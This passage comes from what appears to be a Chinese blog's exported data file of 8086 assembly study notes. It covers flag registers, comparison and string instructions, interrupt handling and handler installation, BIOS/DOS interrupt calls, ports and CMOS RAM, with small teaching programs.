bk: pop ax \n        add ax,30h\n        mov [si],al\n        \n        pop ax \n        add ax,30h\n        mov [si+1],al\n       \n        pop ax \n        add ax,30h\n        mov [si+2],al\n        \n        pop ax \n        add ax,30h\n        mov [si+3],al    ; 将转换后的ASCII码存储在data段中\n        \n        pop ax \n        add ax,30h\n        mov [si+4],al\n        mov byte ptr [si+5],0  ; 字符串以null字符结尾\n        ret\n       \n     \nshow_str:\n     mov si,0\n     mov ax,0b800h\n     mov es,ax\n     \n     mov al,160\n     mul dh\n     mov bx,ax\n     mov al,2\n     mul dl\n     add bx,ax\n     mov al,cl\n    \n         s: mov cl,[si] \n              jcxz ok      ; 如果字符串长度为0，则跳转到ok标签\n              mov dx,[si]\n              mov es:[bx],dx\n              mov es:[bx+1],al\n              inc si\n              add bx,2\n              loop s\n\n ok: ret    \n  code ends\nend start\n\n","slug":"8086汇编_06","date":"2023-07-25T03:20:34.000Z","categories_index":"8086汇编","tags_index":"8086汇编","author_index":"南瓜の无名"},{"id":"6565a0972dbac42ac41da60ecf87342f","title":"8086汇编学习笔记_07","content":"标志寄存器8086CPU的标志寄存器（也称flag）有16位，其中存储的信息通常被称为程序状态字（PSW）\n标志寄存器是按位起作用的。\n8086CPU的标志寄存器的结构：\n\n标志寄存器flag的1、3、5、12、13、14、15位在8086CPU中没有使用，不具有任何含义。而0、2、4、6、7、8、9、10、11位都具有特殊含义。\n1. ZF标志flag的第6位是ZF，零标志位。\n它记录相关指令执行后，其结果是否为0。如果结果为0，那么ZF&#x3D;1；如果结果不为0，那么ZF&#x3D;0。\n对于ZF的值，我们可以这样来看，ZF标记相关指令的计算结果是否为0，如果为0，则在ZF要记录下“是0”这样的肯定信息。\n\n指令：mov ax,1and ax,0执行后，结果为0，则ZF-1，表示“结果是0”。\n指令：mov ax,1or ax,0执行后，结果不为0，则ZF&#x3D;0，表示“结果非0”。\n\n注意：在8086CPU的指令集中，有的指令的执行是影响标志寄存器的，比如,add、sub、mul、div、inc、or、and等，它们大都是运算指令(进行逻辑或算术运算)；有的指令的执行对标志寄存器没有影响，比如:mov、push、pop等，它们大都是传送指令。\n在使用一条指令的时候，要注意这些指令的全部功能，其中包括，执行结果对标志寄存器的哪些标志位造成影响。\n2. PF标志flag的第2位是PF，奇偶标志位。\n它记录相关指令执行后，其结果的所有二进制位中1的个数是否为偶数。如果的个数为偶数，PF&#x3D;1,如果为奇数，那么PF&#x3D;0。\n\n指令：mov al,1add al,10执行后，结果为00001011B，其中有3（奇数）个1，则PF&#x3D;0；\n指令：mov al,1or al,10执行后，结果为00000011B，其中有2（偶数）个1，则PF&#x3D;1；\n\n3. SF标志flag的第7位是SF，符号标志位。\n它记录相关指令执行后，其结果是否为负。如果结果为负，sf&#x3D;1；如果非负，sf&#x3D;0.\nSF标志，就是CPU对有符号运算结果的一种记录，它记录数据的正负。在我们将数据当作有符号数来运算的时候，可以通过它来得到结果的正负。如果我们将数据当作无符号来运算，SF的值则没有意义，虽然相关的指令影响了它的值。\n4. CF标志flag的第0位是CF，进位标志位。\n一般情况下，在进行无符号数运算的时候，记录了运算结果的最高有效位向更高位的进位值，或从更高位的借位值。\n5. OF标志flag的第11位是OF，溢出标志位。\n一般情况下，OF记录了有符号数运算的结果是否发生了溢出。如果发生溢出，OF&#x3D;1；如果没有，OF&#x3D;0.\n一定要注意CF和OF的区别：CF是对无符号数运算有意义的标志位，而OF是对有符号数运算有意义的标志位。\n\n对于无符号数运算，CPU用CF位来记录是否产生了进位；\n对于有符号数运算，CPU用OF位来记录是否产生了溢出。\n当然，还要用SF位来记录结果的符号。\n\n如果我们用add 指令进行的是有符号数运算，则98＋99＝-59这样的结果让人无法接受。\n\n造成这种情况的原因，就是实际的结果197，作为一个有符号数，在8位寄存器al中存放不下。\n\n对于有无符号，计算机是分不清楚状况的，因此他必须两种都记载着，要怎么用，看的是你当他是什么。\n\n例如：mov al 98dadd al,99d\n对于无符号数运算，98+99没有进位，CF&#x3D;0；\n对于有符号数运算，98+99发生溢出，OF&#x3D;1。\n\n\n\n6. adc指令adc是带进位的加法指令，它利用了CF位上记录的进位制。\n格式：adc 操作对象1,操作对象2功能：操作对象1&#x3D;操作对象1+操作对象2+CF比如：add ax,bx实现的功能是：（ax）&#x3D;（ax）+（bx）+ CF\n\n示例一：mov ax,2mov bx,1sub bx,axadc ax,1执行后，（ax）&#x3D; 4\n\nadc执行时，相当于计算：(ax)+1+CF&#x3D;2+1+1+4\n\n示例二：mov ax,1add ax,axadc ax,3执行后，(ax)&#x3D;5adc执行时，相当于计算：(ax)+3+CF&#x3D;2+3+0&#x3D;5\n\n在执行adc指令的时候加上的CF的值的含义，由adc指令前面的指令决定的，也就是说，关键在于所加上的CF值是被什么指令设置的。\n显然，如果CF的值是被sub指令设置的，那么它的含义就是借位值；如果是被add指令设置的，那么它的含义就是进位制。\n编程计算1EF000H+201000H，结果放在ax（高16位）和bx（低16位）中。\n\nmov ax,001EH\nmov bx,0F000H\nadd bx,1000H\nadc ax,0020H\n\nadc指令执行后，也可能产生进位值，所以也会对CF位进行设置。\n\n由于有这样的功能，我们就可以对任意大的数据及进行加法运算。\n\n7.sbb指令和adc类似，利用sbb指令我们可以对任意大的数据进行减法运算。\n8.cmp指令cmp是比较指令，功能相当于减法指令，只是不保存结果。\ncmp指令执行后，将对标志寄存器产生影响。\n其他相关指令通过识别这些被影响段的标志寄存器位来得知比较结果。\n格式：cmp 操作对象1,操作对象2\n作（ax）-（ax）的运算，结果为0，但并不在ax中保存，只影响flag的值。\n比如：\n\ncmp ax,ax\n\n指令执行后：ZF&#x3D;1PF&#x3D;1SF&#x3D;0CF&#x3D;0OF&#x3D;0\n\n\nmov ax,8mov bx,3cmp ax,bx\n\n执行后：（ax）&#x3D;8ZF&#x3D;0PF&#x3D;1SF&#x3D;0CF&#x3D;0OF&#x3D;0\n\n\n\n其实，我么通过cmp指令执行后，相关标志的值就可以看出比较的结果。\n\n现在我们可以看出比较指令的设计思路，即：通过做减法运算，影响标志位寄存器，标志寄存器的相关位记录了比较的结果。\n反过来看cmp ax,bx：\n\n同add、sub指令一样，CPU在执行cmp指令的时候，也包含两种含义：进行无符号数运算和进行有符号数运算。\n所以利用cmp指令可以对无符号数进行比较，也可以对有符号数进行比较。\n我们以cmp ah,bh为例进行说明：如果（ah）&#x3D;（bh），则（ah）-（bh）&#x3D;0，所以：ZF&#x3D;1；如果（ah）≠（bh），则（ah）-（bh）≠0，所以：ZF&#x3D;0；\n所以，我们根据cmp指令执行后ZF的值，就可以知道两个数据是否相等。\n\nCPU如何通过相关的标志位来表示比较的结果：\n\n（1）如果SF&#x3D;1，而OF&#x3D;0OF&#x3D;0，说明没有溢出，逻辑上真正的结果的正负&#x3D;实际结果的正负；因SF&#x3D;1，实际结果为负，所以逻辑上真正的结果为负，所以（ah）&lt;（bh）\n（2）如果SF&#x3D;1，而OF&#x3D;1OF&#x3D;1，说明有溢出，逻辑上真正的正负≠实际结果的正负；溢出导致了实际结果为负，那么逻辑上真正的结果必然为正，说明了（ah）&gt;（bh）\n（3）如果SF&#x3D;0，而OF&#x3D;1OF&#x3D;1，说明有溢出，逻辑上真正的正负≠实际结果的正负；溢出导致实际结果为正，那么逻辑上真正的结果必然为负，所以（ah）&lt;（bh）\n（4）如果SF&#x3D;0，而OF&#x3D;0OF&#x3D;0，说明没有溢出，逻辑上真正的结果的正负&#x3D;实际结果的正负；因SF&#x3D;0，实际结果为非负，所以逻辑上真正的结果必然为非负，所以（ah）≥（bh）\n9. 检测比较结果的条件转移指令条件转移指令检测被cmp指令影响的表示比较结果的标志位。\n这些条件转移指令通常和cmp相配合使用，就像call和ret指令通常相配合使用一样。\n因为cmp指令可以同时进行两种比较，无符号数比较和有符号数比较，多以根据cmp指令的比较结果进行转移的指令也分两种：\n\n根据无符号数的比较结果进行转移的条件转移指令，它们检测ZF、CF的值；\n根据有符号数的比较结果进行转移的条件转移指令，它们检测SF、OF和ZF的值。\n\n\n10. DF标志和串传送指令flag的第10位是DF，方向标志位。\n在串处理指令中，控制每次操作后si、di的增减。\n\ndf&#x3D;0 每次操作后si、di递增\ndf&#x3D;1 每次操作后si、di递减\n\n下面有几个串传送指令\n格式:movsb\n功能:(以字节为单位传送)将ds:si指向的内存单元中的字节送入es:di中，然后根据标志寄存器DF位的值，将si和di递增或递减。\n执行movsb指令相当于进行下面几步操作。\n\n((es)*16+(di)) &#x3D; ((ds)*16+(si))\n\n如果df&#x3D;0 则 (si)&#x3D;(si)+1 (di)&#x3D;(di)+1\n\n\n　如果df&#x3D;1则: (si)&#x3D;(si)-1 (di)&#x3D;(di)-1\n当然也可以传送一个字：movsw\n格式:movsw\n功能：将ds:si指向的内存单元中的字送入es:di中，然后根据标志寄存器df位的值，将si和di递增2或递减2.\n\n\n\n\n\n\n\n\n\nmovsb和movsw进行的是串传送操作中的一个步骤，一般来说，movsb和movsw都和rep配合使用，格式如下:rep movsb\nrep功能:根据cx的值，重复执行后面的串传送指令。由于每执行一次movsb指令si和di都会递增或递减指向后一个单元或前一个单元，则rep movsb就可以循环实现(cx)个字符的传送。\n由于flag的DF位决定着串传送指令执行后,si和di改变的方向,所以CPU应该提供相应的指令来对DF位进行设置,从而使程序员能够决定传送的方向.\n8086CPU提供下面两条指令对df位进行设置：\n\ncld指令: 将标志寄存器的df位置0\nstd指令: 将标志寄存器的df位置1\n\n&#x2F;&#x2F; 1. 编程，用串传送指令，将data段中的第一个字符串复制到它后面的空间中。\n\ndata segment\n     db  &#39;welcome to masm!&#39;\n     db 16 dup (0)\ndata ends\n\ncode segment\nstart: mov ax,data\n       mov ds,ax\n       mov si,0\n       mov es,ax\n       mov di,16\n       mov cx,16\n\n       cld\n       rep  movsb\n\n       mov ax,4c00h\n       int 21h\ncode ends\nend start\n\n&#x2F;&#x2F; 2.编程，用串传送指令，将F000段中的最后16个字符复制到data段中。\n\ndata segment\n         db  16  dup  (0)\ndata ends\n\ncode segment \nstart:     mov ax,0f000h\n           mov ds,ax\n           mov si,0ffffh\n           mov ax,data\n           mov es,ax\n           mov di,15\n           mov cx,16\n\n           std\n           rep  movsb\n\n           mov ax,4c00h\n           int 21h\ncode ends\nend start\n\n11. pushf和popfpushf:将标志寄存器的值压栈;\npopf:从栈中弹出数据,送入标志寄存器中;\npushf和popf,为直接访问标志位寄存器提供了一种方法\n内中断中断是CPU处理外部突发事件的一个重要技术；\n它能使CPU在运行过程中对外部事件发出的中断请求及时地进行处理,处理完成后又立即返回断点,继续进行CPU原来地工作。\n1. 中断分类引起中断地原因或者说发出中断请求地来源叫做中断源.根据中断源的不同,可以把中断分为硬件中断和软件中断两大类,而硬件中断又可以分为外部中断和内部中断两类。\n\n外部中断一般是由计算机外设发出的中断请求,如:键盘中断、打印机中断、定时器中断等。外部中断是可以屏蔽的中断，也就是说，利用中断控制器可以屏蔽这些外部设备的中断请求。\n\n内部中断是指因硬件出错（如突然掉电、奇偶校验错等）或运算出错（除数为零、运算溢出、单步中断等）所引起的中断。内部中断时不可屏蔽的中断。\n\n\n\n\n\n\n\n\n\n\n\n软件中断其实并不是真正的中断，它们只是可被调用执行的一般程序以及DOS的系统功能调用（INT 21H）等都是软件中断。\n2. 中断优先权CPU为了处理并发的中断请求，规定了中断的优先权，中断优先权由高到低的顺序是：（1）除法错、溢出中断、软件中断（2）不可屏蔽中断（3）可屏蔽中断（4）单步中断\n3. 中断类型码CPU的设计者必须在中断信息和其处理的程序的入口地址之间建立某种联系，使得CPU根据中断信息可以找到要执行的处理程序。\n我们知道，中断信息中包含有标识的中断类型码。根据CPU的设计，中断类型码的作用就是用来定位中断处理程序。\nCPU用8位的中断类型码通过中断向量表找到相应的中断处理程序的入口地址。\n4. 中断向量表中断向量表在内存中存放，对于8086PC机，中断向量表指定放在内存地址0处。\n从内存0000:0000到0000:03FF的1024个单元中存放着中断向量表。\n5. 中断过程可以用中断类型码，在中断向量表中找到中断处理程序的入口；\n找到这个入口地址的最终目的时用它设置CS和IP，使CPU执行中断处理程序。\n用中断类型码找到中断向量，并用它设置CS和IP，这个工作是由CPU的硬件自动完成的。\nCPU硬件完成这个工作的过程被称为中断过程。\n8086CPUde中断过程：（1）（从中断信息中）取得中断类型码；（2）标志寄存器的值入栈（保护标志位）（3）设置标志寄存器的第8位TF和第9位IF的值位0；（这一步的目的后面将介绍）（4）CS的内容入栈；（5）IP的内容入栈；（6）从内存地址为中断类型码*4和中断类型码*4+2的两个字单元中读取中断处理程序的入口地址设置IP和CS。\n可以看到CPU将CS、IP保存在栈中。\n我们注意到，在中断过程中还要做的一个工作就是设置标志寄存器的TF、IF位。\n简洁的描述中断过程：（1）取得中断类型码N（2）pushf（3）TF&#x3D;0，IF&#x3D;0（4）push CS（5）push IP（6）（IP）&#x3D;（N * 4），（CS）&#x3D;（N * 4 + 2）在最后一步完成后，CPU开始执行由程序员编写的中断处理程序。\n6. 中断处理程序由于CPU随时都可能检测到中断信息，也就是说，CPU随时都可能执行中断处理程序，所以中断处理程序必须一直存储在内存某段空间之中。\n而中断处理程序的入口地址，即中断向量，必须存储在对应的中断向量表表项中。\n中断处理程序的编写方法和子程序的比较相似，下面是常规的步骤：（1）保存用到的寄存器；（2）处理中断；（3）恢复用到的寄存器；（4）用iret指令返回。\niret指令的功能用汇编语法描述为：pop IPpop CSpopf\niret通常和硬件自动完成的中断过程配合使用。\n可以看到，在中断过程中，寄存器入栈的顺序是标志寄存器、CS、IP，而iret的出栈顺序是IP、CS、标志寄存器，刚好和其对应，实现了用执行中断处理程序前的CPU现场恢复标志寄存器和CS、IP的工作。\niret指令执行后，CPU回到执行中断处理程序前的执行点继续执行程序。\n7. 除法错误的中断处理程序当CPU执行div等除法指令的时候，如果发生了除法溢出错误，将产生中断类型码为0的中断信息，CPU将检测到这个信息，引发中断过程，转去执行0号中断所对应的中断处理程序。\n（1）当发生除法溢出的时候，产生0号中断信息，从而引发中断过程。\n\n此时，CPU将进行以下工作：\n\n获得中断类型码0；\n\n\n\n标志寄存器入栈，TF、IF设置为0；\n\n\n\nCS、IP入栈；\n\n\n\n（IP）&#x3D;（0 * 4），（CS）&#x3D;（0 * 4 + 2）\n\n\n\n\n\n（2）可见，当中断0发生时，CPU将转去执行中断处理程序。\n\n只要按照如下步骤编写中断处理程序，当中断0发生时，即可显示“Hello Word！”\n\n相关处理；\n\n\n\n向显示缓冲区送字符串“Hello Word！”；\n\n\n\n返回DOS。\n\n\n\n\n\n我们将这段程序称为do0。\n（3）现在的问题是：do0应该放在内存中。\n\n因为除法溢出随时可能发生，CPU随时都可能将CS:IP指向do0的入口，执行程序。\n\n&#x2F;&#x2F; 那么do0应该放在哪里？\n\n由于我们是在操作系统之上使用计算机，所有的硬件资源都在操作系统的管理之下，\n所以我们要想得到一块内存存放do0，应该向操作系统申请。\n\n但是在有可能的情况下，我们不去理会操作系统，而直接面向硬件资源。\n\n估计do0的长度不可能超过256个字节，内存0000:0200处就很合适。\n\n（4）我们将中断处理程序放到0000:0200后，若要使得除法溢出发生的时候，CPU转去执行do0，则必须将do0的入口地址（即0000:0200）登记在中断向量表的对应表项中。\n因为除法溢出对应的中断类型码为0，它的中断处理程序的入口地址应该从0*4地址单元开始存放，段地址存放在0*4+2字单元中，偏移地址存放在0*4字单元中。\n也就是说要将do0的段地址0存放在0000:0200字单元中，将偏移地址200H存放在0000:0000字单元中。\n程序框架：\nassume cs:code\ncode segment\nstart:\n    do0安装程序\n    设置中断向量表\n    mov ax,4c00h\n    int 21h\n  do0:\n    显示字符串 “Hello Word!”\n    mov ax,4c00h\n    int 21h\ncode ends\nend start\n\n程序执行时，do0的代码是不执行的，它只是作为do0安装程序所要传送的数据。\n执行do0安装程序，将do0的代码拷贝到内存0:200处，然后设置中断向量表，即偏移地址200H和段地址0，保存在0号表项中。这两部分工作完成后，程序就返回了。\ndo0的代码虽然在程序中，却不再程序执行的时候执行。它是在除法溢出发生的时候才得以执行的中断处理程序。\n8. 单步中断CPU在执行完一条指令之后，如果检测到标志寄存器的TF位为1，则产生单步中断，引发中断过程。\n单步中断的中断类型码为1，则它所引发的中断过程如下：（1）取得中断类型码1；（2）标志寄存器入栈，TF、IF设置为0；（3）CS、IP入栈；（4）（IP）&#x3D;（1 * 4），（CS）&#x3D;（1 * 4 + 2）\n如上述所述，如果TF&#x3D;1，则执行一条指令后，CPU就要转去执行1号中断处理程序。\n9. 相应中断的特殊情况例如，在执行完向ss寄存器传送数据的指令后，即便检测到中断信号，CPU也不会响应。\n这样做的主要原因是，ss:sp联合指向栈顶，而对它们的设置应该连续完成。\n因为，如果在执行完设置ss的指令后，CPU响应中断，引发中断过程，要在栈中压入标志寄存器、CS和IP的值。\n而ss改变，sp并未改变，ss:sp指向的不是正确的栈顶，将引起错误。\nint指令int格式：int n  （n为中断类型码）。\n它的功能是引发中断过程。\n1. int指令CPU执行int n指令，相当于引发一个n号中断的中断过程，执行过程如下：（1）取中断类型码n；（2）标志寄存器入栈，IF&#x3D;0，TF&#x3D;0；（3）CS、IP入栈；（4）（IP）&#x3D;（n * 4），（CS）&#x3D;（n*4+2）\n从此处转去执行n号中断的中断处理程序。\n可以在程序中使用int指令调用任何一个中断的中断处理程序。\nassume cs:code\ncode segment\n    start:mov ax,0b800h\n          mov es,ax\n          mov byte ptr es:[12*160+40*2],&#39;!&#39;\n          int 0\ncode ends\nend start\n\n程序执行后将在屏幕中间显示一个“ ! ”,然后显示“ Divide overflow” 后返回到系统中。”!”是编程显示的，程序是有做除法，但是在结尾使用了int 0指令。CPU执行int 0指令时，将引发中断过程，执行0号中断处理程序，而系统设置的0号中断处理程序的功能是显示“Divide overflow”, 然后返回到系统。\n可见，int指令的最终功能和call指令相似，都是调用一段程序。\n一般情况下，系统将一些具有一定功能的子程序，以中断处理程序的方式提供给应用程序调用。在编程的时候，可以用int 指令调用这些子程序。当然，也可以编写一些中断处理程序供别人使用。\n2. 编写供应用程序调用的中断例程\n\n\n\n\n\n\n\n\nint指令和iret指令的配合使用与call指令和ret指令的配合使用具有相似的思路。\n\n\n\n\n\n\n\n\n\n应该注意例程中用到的寄存器的值的保存和恢复。\n功能：求一word型数据的平方。参数：(ax)＝要计算的数据。返回值：dx、ax中存放结果的高16位和低16位。举例： 求2*3456^2\nassume cs:code\ncode segment\n    start:mov ax,3456    #(ax)&#x3D;3456\n        int 7ch    #调用中断7ch的中断过程,计算ax中的数据的平方,计算结果存在ds(高16位),ax(低16位)中\n        add ax,ax    #ds:ax中的值乘以2第一步,低16位相加,如果进位则CF&#x3D;1\n        adc dx,dx    #dx:ax中的值乘以2第二部,高16位相加并加上CF\n        mov ax,4c00h\n        int 21h\ncode ends\nend start\n\n写中断例程分三步:\n(1) 编写实现求平方功能的程序；(2) 安装程序，将其安装在0:200处；(3) 设置中断向量表，将程序的入口地址保存在7ch表项中，使其成为中断7ch的中断例程。\nassume cs :code\ncode segment\nstart:mov ax,cs\n    mov ds,ax\n    mov si,offset sqr    #设置ds:si指向源地址\n    mov ax,0\n    mov es,ax\n    mov di,200h          #设置es:di指向目的地址\n    mov cx,offset sqrend-offset sqr   #设置ex为传输长度\n    cld                               #设置传输方向为正\n    rep movsb    #从ds:si拷贝到es:di，每拷贝1个字节，cx-1\n    \n    mov ax,0\n    mov es,ax\n    mov word ptr es:[7ch*4],200h    #设置7ch中断程序的偏移量\n    mov word ptr es:[7ch*4+2],0   #设置7ch中断程序的段地址\n    \n    mov ax,4c00h\n    int 21h\n    \nsqr: mul ax\n    iret\nsqrend: nop\n\ncode ends\nend start\n\nCPU执行int 7ch指令进入中断例程之前，标志寄存器、当前的CS和IP被压入栈中，在执行完中断例程后，应该用iret指令恢复int 7ch执行前的标志寄存器和CS 、IP的值，从而接着执行应用程序。\n3. 对int、iret和栈的深入理解我们以一个程序来展开讨论:用7ch中断例程完成loop指令的功能，在屏幕中间显示80个”!”\n\n程序框架如下：\n\nassume cs:code\ncode segment\nstart:\n  mov ax,0b800h         ;向8086CPU显存的地址\n  mov di,160*12         ;显示位置\n  mov bx,offset s - offset se     ;跳转的位移\n  mov cx,80             ;循环次数\ns:\n  mov byte ptr es:[di],&#39;!&#39;\n  add di,2\n  int 7ch               ;进入中断处理程序\nse: nop\n  mov ax,4c00h\n  int 21h\n \ncode ends\nend start\n\n\n中断处理程序的功能如下:\n\n\ndec cx\n如果(cx)!&#x3D;0,转到标号s处执行，否则向下执行\n\n\n7ch 中断例程如何实现到目的地址的转移？\n\n转到标号 s 显然应该设 (CS) &#x3D; 标号 s 的段地址，(IP) &#x3D; 标号 s 的偏移地址。\n中断例程中，可以从栈里取得标号 s 的段地址和标号 se 的偏移地址，而用标号 se 的偏移地址加上 bx 中存放的转移位移就可以得到标号 s 的偏移地址。\n利用 iret 指令，设置 CS:IP。我们可以将栈中的 se 的偏移地址加上 bx 中的转移位移，则栈中的 se 得而偏移地址就变为了 s 的偏移地址。我们再使用 iret 指令，用栈中的内容设置 CS、IP，从而实现转移到标号 s 处。\n\n\n\n7c的中断程序如下:\nlp:\n  push bp\n  mov bp,sp\n  dec cx\n  jcxz lpret\n  add [bp+2],bx\nlpret:\n  pop bp\n  iret\n\n4. BIOS 和 DOS 所提供的中断例程在系统板的 ROM 中存放着一套程序，称为 BIOS(基本输入输出系统)，BIOS 中主要包含以下几部分内容：\n\n硬件系统的检测和初始化程序；\n外部中断和内部终端的中断例程；\n用于对硬件设备进行 I&#x2F;O 操作的中断例程；\n其他和硬件系统相关的中断例程。\n\n操作系统 DOS 也提供了中断例程，从操作系统的角度来看，就是向程序员提供了编程资源。\nBIOS和DOS在所提供的中断例程中包含了许多子程序，这些子程序实现了程序员在编程的时候经常需要用到的功能。程序员在编程的时候，可以用int指令直接调用BIOS和DOS提供的中断例程，来完成某些工作。\n和硬件设备相关的DOS中断例程中，一般都调用了BIOS的中断例程。\n5. BIOS 和 DOS 中断例程的安装\n6. BIOS 中断例程应用int 10h中断例程是BIOS提供的中断例程，其中包含了多个和屏幕输出相关的子程序。\n一般来说，一个中断例程中往往包含多个子程序，中断例程内部用传递进来的参数来决定执行哪一个子程序。BIOS 和 DOS 都用 ah 来传递内部子程序的编号。\n\n(ah)&#x3D;2 表示调用第10h 号中断例程的2号子程序，功能为设置光标位置，可以提供光标所在的行号(80 * 25 字符模式下： 0～24) 、列号(80 * 25 字符模式下： 0～79) ，和页号作为参数。\n\n(bh)&#x3D;0, (dh)&#x3D;5, (dl)&#x3D; 12, 设置光标到第0页， 第5行， 第12列。\n\n\nbh中页号的含义：内存地址空间中， B8000H~BFFFFH共32kB 的空间，为80*25彩色字符模式的显示缓冲区。\n一屏的内容在显示缓冲区中共占4000 个字节。\n也就是说，通常情况下，B8000H~B8F9FH中的4000个字节的内容将出现在显示器上。\n显示缓冲区分为8 页，每页4KB(4000B) ，显示器可以显示任意一页的内容。一般情况下，显示第0页的内容。\n&#x2F;&#x2F; 编程：在屏幕的5行12列显示3个红底高亮闪烁绿色的&#39;a&#39;。\nassume cs:code\ncode segment\n    mov ah,2    ;置光标\n    mov bh,0    ;第0页\n    mov dh,5    ;dh中放行号\n    mov dl,12   ;dl中放列号\n    int 10h\n    \n    mov ah,9    ;在光标位置显示字符\n    mov al,&#39;a&#39;  ;字符\n    mov bl, 11001010b    ;颜色属性\n    mov bh,0    ;第0页\n    mov cx,3    ;字符重复个数\n    int 10h\n    \n    mov ax,4c00h\n    int 21h\ncode ends\nend\n\n7. DOS中断例程应用int 21h 中断例程是DOS 提供的中断例程，其中包含了DOS 提供给程序员在编程时调用的子程序。\nint 21h中断例程的4ch号功能，即程序返回功能，如下：mov ah,4ch    ;程序返回mov al,0      ;返回值int 21h\n(ah)&#x3D;4ch表示调用第21h号中断例程的4ch号子程序，功能为程序返回，可以提供返回值作为参数。\n&#x2F;&#x2F; int 21h中断例程在光标位置显示字符串的功能：\nds:dx指向字符串   ;要显示的字符串需用“$”作为结束符\nmov ah,9         ;功能号9,表示在光标位置显示字符串\nint 21h\n\n(ah)&#x3D;9 表示调用第21h 号中断例程的9 号子程序，功能为在光标位置显示字符串，可以提供要显示字符串的地址作为参数。\n编程：在屏幕的5行12列显示字符串“Welcome to masm!”。\nassume cs:code\n\ndata segment\n    db &#39;Welcome to masm&#39;,&#39;$&#39;\ndata ends\n\ncode segment\n    start:mov ah,2    ;置光标\n    mov bh,0          ;第0 页\n    mov dh,5          ;dh中放行号\n    mov dl,12         ;dl 中放列号\n    int 10h\n    \n    mov ax,data\n    mov ds,ax\n    mov dx,0          ;ds:dx指向字符串的首地址data:O\n    mov ah,9\n    int 21h\n    \n    mov ax,4c00h\n    int 21h\ncode ends\n\nend start\n\n上述程序在屏幕的5行12列显示字符串“Welcome to masm!”, 直到遇见“$”（“$”本身并不显示，只起到边界的作用）。\n如果字符串比较长，遇到行尾，程序会自动跳转到下一行开头处继续显示；如果到了最后一行，还能自动上卷一行。\n","slug":"8086汇编_07","date":"2023-07-25T03:20:34.000Z","categories_index":"8086汇编","tags_index":"8086汇编","author_index":"南瓜の无名"},{"id":"1401df5d38db739612f2fd959b8dc1d1","title":"8086汇编学习笔记_08","content":"端口CPU 可以直接读写 3 个地方的数据：CPU 内部的寄存器、内存单元、端口。\n1. 端口的读写CPU 通过端口地址来定位端口。因为端口所在的芯片和 CPU 通过总线相连，所以端口地址和内存地址一样，通过地址总线来传送。PC 系统中，CPU 最多可以定位 64KB 个不同的端口。则端口地址的范围为 0~65535。\n端口的读写指令只有两条：in 和 out。分别从端口读取和写入数据。\n比较 CPU 执行内存访问指令和端口访问指令时，总线上的信息：\n\n访问内存：\n\nmov ax,ds:[8]\n假设执行前（ds）&#x3D; 0\nCPU 通过地址线将地址信息 8 发出；CPU 通过控制线发出内存读命令，选中存储器芯片，并通知它，将要从中读取数据；存储器将 8 号单元中的数据通过数据线送入CPU。\n\n访问端口：\n\nin al,60h     ;从60h端口读入一个字节\nCPU 通过地址线将地址信息 60h 发出；CPU 通过控制线发出端口读命令，选中端口所在的芯片，并通知它，将要从中读取数据；端口所在的芯片将 60h 端口中的数据通过数据线送入 CPU。\n注意：in 和 out 指令中，只能使用 ax 或 al 来存放从端口中读入的数据或要发送到端口中的数据。8 位端口用 al，用 16 位端口用 ax。\n对0 ~ 255以内的端口进行读写：in al,20h   ;从20h端口读入一个字节out 20h,al  ;往20h端口写入一个字节\n对256 ~ 65535的端口进行读写时，端口号放在dx中：mov dx,3f8h ;将端口号3f8送入dxin al,dx    ;从3f8h端口读入一个字节out dx,al   ;向3f8h端口写入一个字节\n2. CMOS RAM 芯片CMOS 芯片的特征：\n\n包含一个实时钟和一个有 128 个存储单元的 RAM 存储器(早期的计算机为 64 个字节)。\n该芯片靠电池供电。所以，关机后其内部的实时钟仍可正常工作，RAM 中的信息不丢失。\n128 个字节的 RAM 中，内部实时钟占用 0~0dh 单元来保存时间信息，其余大部分单元用于保存系统配置信息，供系统启动时 BIOS 程序读取。\nBIOS 也提供了相关的程序，可以在开机时配置 CMOS RAM 中的系统信息。\n\n\n该芯片有两个端口，端口地址为 70h 和 71h。CPU 通过这两个端口来读写 CMOS RAM。\n70h 为地址端口，存放要访问的 CMOS RAM 单元的地址；71h 为数据端口，存放从选定的 CMOS RAM 单元中读取的数据，或要写入其中的数据。\n\n可见，CPU对CMOS RAM的读写分两步进行。\n3. shl和shr指令shl 和 shr 是逻辑移位指令。\n\nshl 是逻辑左移指令，它的功能是：\n\n将一个寄存器或内存单元中的数据向左移位；\n将最后移出的一位写入 CF 中；\n最低位用 0 补充。\n如果移动位数大于 1 时，必须将移动位数放在 cl 中。\n\n\nshr 是逻辑右移指令，它的功能是：\n\n将一个寄存器或内存单元中的数据向右移位；\n将最后移出的一位写入 CF 中；\n最低位用 0 补充。\n如果移动位数大于 1 时，必须将移动位数放在 cl 中。\n\n\n\n4. CMOS RAM中存储的事件信息在 CMOS RAM 中，存放着当前的时间：年、月、日、时、分、秒。这 6 个信息的长度都位 1 个字节，存放单元为：\n\n\n\n时间\n秒\n分\n时\n日\n月\n年\n\n\n\n字节\n0\n2\n4\n7\n8\n9\n\n\n这些数据以 BCD 码的方式存放。\n\n\n\n十进制数码\n0\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\nBCD 码\n0000\n0001\n0010\n0011\n0100\n0101\n0110\n0111\n1000\n1001\n\n\n可见，一个字节可表示连个BCD码。\n则CMOS RAM存储时间信息的单元中，存储了用两个BCS码表示的两个十进制数，高4位标识的BCD码表示十位，低4位BCD码表示个位。\n外中断cpu在计算机系统中，除了能够执行命令，进行运算以外，还应该能够对外部设备进行控制，接收它们的输入，向它们进行输出。也就是说，cpu除了有运算能力外，还要有I&#x2F;O能力。\n1. 接口芯片和端口在PC系统的接口卡和主板上，装有各种接口芯片。这些外设接口芯片的内部有若干寄存器，cpu将这些寄存器当作端口来访问。外设的输入不直接送入内存和cpu，而是送入相关的接口芯片和端口中。cpu向外设的输出也不是直接送入外设，而实先送入端口中，再由相关的芯片送到外设。\n2. 外中断信息在PC系统中，外中断源一共由两种：\n\n可屏蔽中断\n不可屏蔽中断\n\n可屏蔽中断是CPU可以不响应的外中断。CPU是否响应可屏蔽中断，要看标志寄存器的IF位的设置。\n当CPU 检测到可屏蔽中断信息时：\n\n如果IF&#x3D;1，则CPU 